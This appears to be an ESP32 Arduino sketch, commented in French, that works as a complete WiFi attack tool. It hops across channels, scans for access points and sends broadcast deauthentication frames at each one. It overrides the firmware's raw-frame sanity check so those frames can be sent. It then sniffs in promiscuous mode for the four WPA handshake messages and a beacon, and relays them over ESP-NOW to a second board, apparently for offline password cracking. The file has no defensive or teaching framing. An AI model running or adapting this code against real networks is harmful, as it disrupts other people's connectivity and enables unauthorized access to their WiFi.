#include <WiFi.h>
#include "esp_wifi.h"
#include <Adafruit_NeoPixel.h>
#include <esp_now.h>
#include <esp_wifi_types.h>

#define LED_PIN    27
Adafruit_NeoPixel led(1, LED_PIN, NEO_GRB + NEO_KHZ800);

#define C_OFF     0
#define C_WHITE   led.Color(255, 255, 255)
#define C_BLUE    led.Color(  0,   0, 255)
#define C_GREEN   led.Color(  0, 255,   0)
#define C_RED     led.Color(255,   0,   0)
#define C_CYAN    led.Color(  0, 255, 255)
#define C_YELLOW  led.Color(255, 255,   0)


inline void setLed(uint32_t c) {
  led.setPixelColor(0, c);
  led.show();
}
inline void flashLed(uint32_t c, uint16_t t_ms) {
  setLed(c);
  delay(t_ms);
  setLed(C_OFF);
}

//dont touch these channel see below
static const uint8_t channelsListAll[] = {
  // 2.4 GHz
  1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13,
  // 5 GHz (UNII-1, UNII-2, UNII-3)
  36, 40, 44, 48,
  52, 56, 60, 64,
  100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
  149, 153, 157, 161, 165
};
static const size_t NUM_CHANNELS_ALL = sizeof(channelsListAll) / sizeof(channelsListAll[0]);

//change these channels for hopping on specifics channels
const uint8_t channelsToHop[] = {
  // 2.4 GHz uncomment if you want a full dual band
  1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13,
  // 5 GHz (UNII-1, UNII-2, UNII-3)
  /*36, 40, 44, 48,
  52, 56, 60, 64,
  100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
  149, 153, 157, 161, 165*/
};
const size_t NUM_HOP_CHANNELS = sizeof(channelsToHop) / sizeof(channelsToHop[0]);

#define MAC_HISTORY_LEN 20

struct mac_addr {
  uint8_t b[6];
};
mac_addr mac_history[MAC_HISTORY_LEN] = {};
uint8_t mac_cursor = 0;

void save_mac(const uint8_t *mac) {
  memcpy(mac_history[mac_cursor].b, mac, 6);
  mac_cursor = (mac_cursor + 1) % MAC_HISTORY_LEN;
}

bool already_seen(const uint8_t *mac) {
  for (uint8_t i = 0; i < MAC_HISTORY_LEN; ++i) {
    if (!memcmp(mac, mac_history[i].b, 6)) return true;
  }
  return false;
}

void clear_mac_history() {
  memset(mac_history, 0, sizeof(mac_history));
  mac_cursor = 0;
  Serial.println(F("MAC history cleared."));
  flashLed(C_YELLOW, 300);
}

static const char* security_to_string(wifi_auth_mode_t m) {
  switch (m) {
    case WIFI_AUTH_OPEN:            return "OPEN";
    case WIFI_AUTH_WEP:             return "WEP";
    case WIFI_AUTH_WPA_PSK:         return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:        return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENTERPRISE";
    case WIFI_AUTH_WPA3_PSK:        return "WPA3_PSK";
    default:                        return "UNKNOWN";
  }
}

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t, int32_t) {
  return (arg == 31337) ? 1 : 0;
}

void sendDeauthPacket(const uint8_t *bssid, uint8_t ch) {
  static const uint8_t tpl[26] PROGMEM = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0,
    0x00, 0x00,
    0x07, 0x00
  };
  uint8_t pkt[26];
  memcpy_P(pkt, tpl, 26);
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);

  if (ch <= 14) {
    esp_wifi_set_band(WIFI_BAND_2G);
  } else {
    esp_wifi_set_band(WIFI_BAND_5G);
  }
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  for (uint8_t i = 0; i < 10; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    delay(5);
  }
  flashLed(C_RED, 50);
}

bool firstEAPOLCaptured   = false;
uint8_t apBSSID[6]        = {0};
bool beaconCaptured       = false;
bool allFramesCollected   = false;

const int MAX_FRAME_SIZE   = 2346;
const int MAX_EAPOL_FRAMES = 4;
uint8_t eapolFrames[MAX_EAPOL_FRAMES][MAX_FRAME_SIZE];
int     eapolFrameLengths[MAX_EAPOL_FRAMES];
int     eapolFramesCaptured   = 0;

uint8_t beaconFrame[MAX_FRAME_SIZE];
int     beaconFrameLength     = 0;

#define ESPNOW_MAX_DATA_LEN  250
typedef struct {
  uint16_t frame_len;         // 2 octets
  uint8_t  fragment_number;   // 1 octet
  bool     last_fragment;     // 1 octet
  uint8_t  boardID;           // 1 octet (index dans channelsListAll +1)
  uint8_t  frame[MAX_FRAME_SIZE];
} wifi_frame_fragment_t;

#define MAX_FRAGMENT_SIZE \
  (ESPNOW_MAX_DATA_LEN - /*2 + 1 + 1 + 1 = 5*/ 5)

wifi_frame_fragment_t wifiFrameFragment;

#define FRAGMENT_QUEUE_SIZE  20
typedef struct {
  uint8_t data[ESPNOW_MAX_DATA_LEN];
  size_t  len;
} fragment_queue_item_t;

fragment_queue_item_t fragmentQueue[FRAGMENT_QUEUE_SIZE];
int fragmentQueueStart = 0;
int fragmentQueueEnd   = 0;
bool isSending               = false;
bool waitingForSendCompletion = false;

uint8_t broadcastAddress[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

size_t currentChannelIndexHop = 0;
uint8_t BOARD_ID              = 0;

// ─────────────────────────────────────────────────────────────────────────────
// 1) Enqueue sécurisé
void enqueueFragment(const uint8_t* data, size_t len) {
  if (len == 0 || len > ESPNOW_MAX_DATA_LEN) return;   // garde-fou
  int nextEnd = (fragmentQueueEnd + 1) % FRAGMENT_QUEUE_SIZE;
  if (nextEnd == fragmentQueueStart) {                 // file pleine
    Serial.println("Fragment queue full – dropped");
    return;
  }
  memcpy(fragmentQueue[fragmentQueueEnd].data, data, len);
  fragmentQueue[fragmentQueueEnd].len = len;
  fragmentQueueEnd = nextEnd;
}

// ─────────────────────────────────────────────────────────────────────────────
// 2) Envoi avec boucle de vérification (toujours sur canal 1)
void sendNextFragment() {
  // Avant tout envoi, forcer le Wi-Fi sur le canal 1
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

  while (fragmentQueueStart != fragmentQueueEnd) {
    size_t len = fragmentQueue[fragmentQueueStart].len;
    if (len == 0 || len > ESPNOW_MAX_DATA_LEN) {
      // fragment invalide → sauter
      fragmentQueueStart = (fragmentQueueStart + 1) % FRAGMENT_QUEUE_SIZE;
      continue;
    }
    isSending = true;
    esp_err_t res = esp_now_send(
                      broadcastAddress,
                      fragmentQueue[fragmentQueueStart].data,
                      len
                    );
    if (res == ESP_OK) {
      // Le callback onDataSent passera au fragment suivant
      return;
    }
    Serial.printf("esp_now_send error %s (%d)\n", esp_err_to_name(res), res);
    fragmentQueueStart = (fragmentQueueStart + 1) % FRAGMENT_QUEUE_SIZE;
  }
  isSending = false;
}

// ─────────────────────────────────────────────────────────────────────────────
// 3) Réinitialiser l’état de capture ET purger la file ESP-NOW
void resetCaptureState() {
  firstEAPOLCaptured   = false;
  beaconCaptured       = false;
  allFramesCollected   = false;
  eapolFramesCaptured  = 0;
  memset(apBSSID, 0, sizeof(apBSSID));
  memset(eapolFrames, 0, sizeof(eapolFrames));
  memset(eapolFrameLengths, 0, sizeof(eapolFrameLengths));
  memset(beaconFrame, 0, sizeof(beaconFrame));
  beaconFrameLength    = 0;
  // Purger la file ESP-NOW
  fragmentQueueStart = fragmentQueueEnd = 0;
  isSending = false;
}

// ─────────────────────────────────────────────────────────────────────────────
// 4) Callback d’envoi ESP-NOW
void onDataSent(const wifi_tx_info_t *info, esp_now_send_status_t status) {
  if (status == ESP_NOW_SEND_SUCCESS) {
    Serial.println("Fragment sent successfully");
  } else {
    Serial.printf("Failed to send fragment: %d\n", status);
  }
  fragmentQueueStart = (fragmentQueueStart + 1) % FRAGMENT_QUEUE_SIZE;
  if (fragmentQueueStart == fragmentQueueEnd) {
    isSending = false;
    waitingForSendCompletion = false;
    Serial.println("=== Tous les fragments envoyés via ESP-NOW ===");
    esp_wifi_set_promiscuous(false);
    resetCaptureState();
    setLed(C_WHITE);
  } else {
    sendNextFragment();
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// 5) Comparaison MAC
bool mac_cmp(const uint8_t* a, const uint8_t* b) {
  return memcmp(a, b, 6) == 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// 6) Détecter EAPOL
bool isEAPOL(const wifi_promiscuous_pkt_t* pkt) {
  const uint8_t *pl = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 38) return false;
  uint16_t fc = (pl[1] << 8) | pl[0];
  uint8_t type = (fc & 0x000C) >> 2;
  if (type != 2) return false;
  uint8_t subtype = (fc & 0x00F0) >> 4;
  bool hasQoS = subtype & 0x08;
  int hdr = 24 + (hasQoS ? 2 : 0);
  return pl[hdr] == 0xAA && pl[hdr + 1] == 0xAA && pl[hdr + 2] == 0x03
         && pl[hdr + 6] == 0x88 && pl[hdr + 7] == 0x8E;
}

// ─────────────────────────────────────────────────────────────────────────────
// 7) Détecter Beacon
bool isBeacon(const wifi_promiscuous_pkt_t* pkt) {
  const uint8_t *pl = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return false;
  uint16_t fc = (pl[1] << 8) | pl[0];
  uint8_t type = (fc & 0x000C) >> 2;
  uint8_t subtype = (fc & 0x00F0) >> 4;
  return (type == 0 && subtype == 8);
}

void extractBSSID(const uint8_t* pl, uint16_t fc, uint8_t* bssid) {
  uint8_t type   = (fc & 0x000C) >> 2;
  uint8_t toDS   = (fc & 0x0100) >> 8;
  uint8_t fromDS = (fc & 0x0200) >> 9;
  if (type == 0) {
    memcpy(bssid, pl + 16, 6);
  } else if (type == 2) {
    if (!toDS && !fromDS)        memcpy(bssid, pl + 16, 6);
    else if ( toDS && !fromDS)   memcpy(bssid, pl + 4,  6);
    else if (!toDS &&  fromDS)   memcpy(bssid, pl + 10, 6);
    else                         memset(bssid, 0, 6);
  } else {
    memset(bssid, 0, 6);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// 8) pushFragment : construit directement le buffer de 5 octets d’en-tête + payload
void pushFragment(uint8_t frag, bool last, uint8_t boardID,
                  const uint8_t* payload, uint16_t plen)
{
  if (plen == 0 || plen > MAX_FRAGMENT_SIZE) return;
  uint8_t buf[ESPNOW_MAX_DATA_LEN];
  uint8_t* p = buf;
  // [0..1]   = frame_len (uint16_t)
  *(uint16_t*)p = plen;
  p += 2;
  // [2]      = fragment_number
  *p++ = frag;
  // [3]      = last_fragment
  *p++ = (uint8_t)last;
  // [4]      = boardID
  *p++ = boardID;
  // [5..]    = payload chunk
  memcpy(p, payload, plen);
  enqueueFragment(buf, 5 + plen);
}

// ─────────────────────────────────────────────────────────────────────────────
// 9) queueFrameFragments → enfile tous les morceaux
void queueFrameFragments(const uint8_t* data, uint16_t len, uint8_t boardID) {
  uint16_t sent = 0;
  uint8_t  f    = 0;
  while (sent < len) {
    uint16_t chunk = min<uint16_t>(MAX_FRAGMENT_SIZE, len - sent);
    bool last = (sent + chunk >= len);
    pushFragment(f++, last, boardID, data + sent, chunk);
    sent += chunk;
  }
}

int getEAPOLMessageNumber(const uint8_t* pl, int len) {
  /* 1) Longueur minimale                                                     */
  if (len < 60) return -1;          // en-dessous d’un EAPOL complet

  /* 2) Déterminer la présence d’un champ QoS pour trouver l’offset EAPOL     */
  uint16_t fc = (pl[1] << 8) | pl[0];
  bool hasQoS = (fc & 0x0080);      // bit QoS dans le subtype
  int hdr_len = 24 + (hasQoS ? 2 : 0);
  int llc_off = hdr_len;            // LLC header (8 octets)
  int eapol_off = llc_off + 8;

  if (len < eapol_off + 6) return -1;

  const uint8_t* eapol = pl + eapol_off;

  /* 3) Interpréter le champ Key Info                                         */
  uint16_t key_info = (eapol[5] << 8) | eapol[6];
  bool install = key_info & (1 << 6);
  bool ack     = key_info & (1 << 7);
  bool mic     = key_info & (1 << 8);
  bool secure  = key_info & (1 << 9);

  if (!mic &&  ack && !install && !secure) return 1;
  if ( mic && !ack && !install && !secure) return 2;
  if ( mic &&  ack &&  install &&  secure) return 3;
  if ( mic && !ack && !install &&  secure) return 4;

  return -1;                         // paquet EAPOL non reconnu
}

/* ─── Renvoie true quand les 4 messages distincts ont été capturés ───────── */
bool allEAPOLCaptured(){
  for (int i = 0; i < MAX_EAPOL_FRAMES; ++i)
    if (eapolFrameLengths[i] == 0) return false;
  return true;
}

// ─────────────────────────────────────────────────────────────────────────────
// 10) Handler du sniffer promiscuousy
void wifi_sniffer_packet_handler(void* buf, wifi_promiscuous_pkt_type_t t){
  if (allFramesCollected) return;               // rien à faire

  auto* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* pl = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;

  /* ─── Récupération du BSSID du paquet ──────────────────────────────────── */
  uint16_t fc = (pl[1] << 8) | pl[0];
  uint8_t bssid[6];
  extractBSSID(pl, fc, bssid);

  /* ─── Gestion des trames EAPOL ─────────────────────────────────────────── */
  if (isEAPOL(pkt)) {
    int msgNum = getEAPOLMessageNumber(pl, len);
    if (msgNum < 1 || msgNum > 4) return;       // paquet exotique, on ignore

    if (!firstEAPOLCaptured) {
      memcpy(apBSSID, bssid, 6);
      firstEAPOLCaptured = true;
      Serial.println("First EAPOL captured!");
    }

    if (mac_cmp(apBSSID, bssid) && eapolFrameLengths[msgNum - 1] == 0) {
      memcpy(eapolFrames[msgNum - 1], pl, len);
      eapolFrameLengths[msgNum - 1] = len;
      eapolFramesCaptured++;
      Serial.printf("EAPOL #%d captured!\n", msgNum);
    }
  }
  /* ─── Gestion de la Beacon correspondante ─────────────────────────────── */
  else if (isBeacon(pkt) &&
           firstEAPOLCaptured &&
           mac_cmp(apBSSID, bssid) &&
           !beaconCaptured) {
    int realLen = len - 4;                         // retirer CRC éventuelle
    memcpy(beaconFrame, pl, realLen);
    beaconFrameLength = realLen;
    beaconCaptured = true;
    Serial.println("Beacon frame captured!");
  }

  /* ─── Condition de fin de capture ─────────────────────────────────────── */
  if (firstEAPOLCaptured &&
      allEAPOLCaptured() &&
      beaconCaptured &&
      !allFramesCollected) {

    allFramesCollected = true;
    Serial.println("=== 4 EAPOL + 1 Beacon → préparation envoi ESP-NOW ===");
    
    fragmentQueueStart = fragmentQueueEnd = 0;
    isSending = false;

    esp_now_deinit();
    esp_now_init();
    esp_now_register_send_cb(onDataSent);

    if (esp_now_is_peer_exist(broadcastAddress))
      esp_now_del_peer(broadcastAddress);

    esp_now_peer_info_t peerInfo = {};
    memcpy(peerInfo.peer_addr, broadcastAddress, 6);
    peerInfo.channel = 0;
    peerInfo.encrypt = false;
    peerInfo.ifidx   = WIFI_IF_STA;
    esp_now_add_peer(&peerInfo);

    uint8_t actualChan = WiFi.channel();
    for (size_t i = 0; i < NUM_CHANNELS_ALL; ++i)
      if (channelsListAll[i] == actualChan) {
        BOARD_ID = i + 1;
        break;
      }

    queueFrameFragments(beaconFrame, beaconFrameLength, BOARD_ID);
    for (int i = 0; i < MAX_EAPOL_FRAMES; ++i)
      queueFrameFragments(eapolFrames[i], eapolFrameLengths[i], BOARD_ID);

    waitingForSendCompletion = true;
    sendNextFragment();                            // émission via canal 1
  }
}

void updateBoardIDForChannel(uint8_t newCh) {
  for (size_t i = 0; i < NUM_CHANNELS_ALL; i++) {
    if (channelsListAll[i] == newCh) {
      BOARD_ID = i + 1;
      return;
    }
  }
  BOARD_ID = 0;
}

size_t currentHopIndex = 0;

void setup() {
  Serial.begin(115200);
  led.begin();
  led.setBrightness(25);
  setLed(C_WHITE);
  esp_wifi_set_max_tx_power(84);

  WiFi.mode(WIFI_STA);

  if (esp_now_init() != ESP_OK) {
    Serial.println("ESP-NOW init failed !");
  } else {
    esp_now_register_send_cb(onDataSent);
    Serial.println("ESP-NOW init done.");
  }
  currentHopIndex = 0;
}

void loop(){
  /* 0) Protection : ne rien faire tant qu’il reste des fragments à envoyer  */
  if (isSending || waitingForSendCompletion) return;

  /* 1) S’assurer que le sniffer est désactivé avant tout nouveau scan       */
  esp_wifi_set_promiscuous(false);
  delay(10);

  /* 2) Sélection du canal à explorer                                        */
  uint8_t ch = channelsToHop[currentHopIndex];
  esp_wifi_set_band((ch <= 14) ? WIFI_BAND_2G : WIFI_BAND_5G);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  delay(10);

  setLed(C_BLUE);
  Serial.printf("\n=== Scanning & Deauth on channel %d ===\n", ch);

  /* 3) Scan ciblé sur le canal courant                                      */
  int n = WiFi.scanNetworks(/*async=*/false, /*show_hidden=*/false,/*passive=*/false, /*max_ms_per_chan=*/250, ch);

  if (n > 0) {
    for (int i = 0; i < n; ++i) {
      const uint8_t* bssid = WiFi.BSSID(i);
      if (already_seen(bssid)) {
        Serial.println("Already deauth : " + WiFi.BSSIDstr(i));
        continue;
      }
      Serial.printf("---- AP trouvé ----\n  SSID: %s\n  BSSID: %s\n"
                    "  Security: %s\n  RSSI: %d dBm\n  Channel: %d\n"
                    "--------------------\n",
                    WiFi.SSID(i).c_str(),
                    WiFi.BSSIDstr(i).c_str(),
                    security_to_string(WiFi.encryptionType(i)),
                    WiFi.RSSI(i), ch);

      save_mac(bssid);
      sendDeauthPacket(bssid, ch);
    }

    setLed(C_OFF);
    WiFi.scanDelete();

    /* 4) Préparation du sniffer promiscuous pour capter handshake + Beacon  */
    Serial.println("=== Waiting for EAPOL + Beacon ===");
    resetCaptureState();
    updateBoardIDForChannel(ch);

    setLed(C_GREEN);
    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
    esp_wifi_set_promiscuous(true);

    unsigned long startSniff = millis();
    const unsigned long sniffTimeout = 1500;         // 1,5 s
    while (!allFramesCollected && millis() - startSniff < sniffTimeout)
      delay(50);

    if (!allFramesCollected) {
      Serial.println("=== Timeout sniff. ===");
      resetCaptureState();
    }

    /* 5) Attendre la fin d’envoi ESP-NOW le cas échéant                     */
    while (isSending || waitingForSendCompletion) delay(1);
  }
  else {
    Serial.println("No AP on channel " + String(ch));
    setLed(C_CYAN);
    WiFi.scanDelete();
  }

  /* 6) Passage au canal suivant (incrément unique)                          */
  if (!waitingForSendCompletion)
    currentHopIndex = (currentHopIndex + 1) % NUM_HOP_CHANNELS;

  /* 7) Réinitialisation périodique de l’historique MAC                      */
  if (currentHopIndex == 0) {
    clear_mac_history();
    Serial.println("=== MAC history reset after full hop cycle ===");
    flashLed(C_YELLOW, 50);
  }
}
